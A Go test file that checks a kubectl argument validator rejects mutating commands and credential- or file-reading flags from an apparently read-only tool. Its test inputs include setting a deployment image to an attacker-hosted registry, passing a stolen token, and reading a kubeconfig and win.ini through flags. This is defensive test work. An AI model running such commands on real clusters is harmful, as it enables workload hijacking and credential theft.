package tools

import "testing"

func TestKubectlValidationRejectsMutationsFromReadOnlyTool(t *testing.T) {
	tests := []string{
		"kubectl set image deployment/api api=attacker.invalid/image:latest",
		"kubectl patch deployment api --patch-file C:/temp/patch.json",
		"kubectl rollout undo deployment/api",
	}

	for _, command := range tests {
		args, err := splitCommandLine(command)
		if err != nil {
			t.Fatalf("split %q: %v", command, err)
		}
		if err = validateKubectlArgs(args[1:]); err == nil {
			t.Fatalf("expected mutating command to be rejected: %s", command)
		}
	}
}

func TestKubectlValidationRejectsLocalCredentialAndFileFlags(t *testing.T) {
	tests := []string{
		"kubectl get pods --kubeconfig C:/Users/test/.kube/config",
		"kubectl get pods --token stolen-token",
		"kubectl get pods -o go-template-file=C:/Windows/win.ini",
	}

	for _, command := range tests {
		args, err := splitCommandLine(command)
		if err != nil {
			t.Fatalf("split %q: %v", command, err)
		}
		if err = validateKubectlArgs(args[1:]); err == nil {
			t.Fatalf("expected unsafe local flag to be rejected: %s", command)
		}
	}
}
